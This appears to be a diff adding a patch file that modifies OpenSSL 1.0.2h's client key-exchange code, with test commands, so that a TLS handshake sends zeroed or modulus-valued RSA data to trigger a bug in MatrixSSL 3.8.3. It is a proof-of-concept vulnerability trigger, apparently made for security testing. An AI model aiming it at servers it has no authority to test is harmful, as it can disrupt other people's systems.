@@ -1,0 +1,20 @@
+This patch allows one to send malformed RSA encryptions during the handshake.
+One can either send zeros or the RSA key modulus. Both trigger a bug in
+MatrixSSL 3.8.3.
+Test:
+RSA_BREAK_ZERO=1 apps/openssl s_client -connect [host]:[port] -cipher RSA
+RSA_BREAK_MODULUS=1 apps/openssl s_client -connect [host]:[port] -cipher RSA
+
+--- openssl-1.0.2h-vanilla/ssl/s3_clnt.c	2016-05-03 15:44:42.000000000 +0200
++++ openssl-1.0.2h/ssl/s3_clnt.c	2016-07-04 22:09:46.610230998 +0200
+@@ -2535,6 +2535,10 @@
+             if (s->options & SSL_OP_PKCS1_CHECK_2)
+                 tmp_buf[0] = 0x70;
+ # endif
++	    if (getenv("RSA_BREAK_ZERO"))
++		bzero(p, RSA_size(rsa));
++	    else if (getenv("RSA_BREAK_MODULUS"))
++		BN_bn2bin(rsa->n, p);
+             if (n <= 0) {
+                 SSLerr(SSL_F_SSL3_SEND_CLIENT_KEY_EXCHANGE,
+                        SSL_R_BAD_RSA_ENCRYPT);
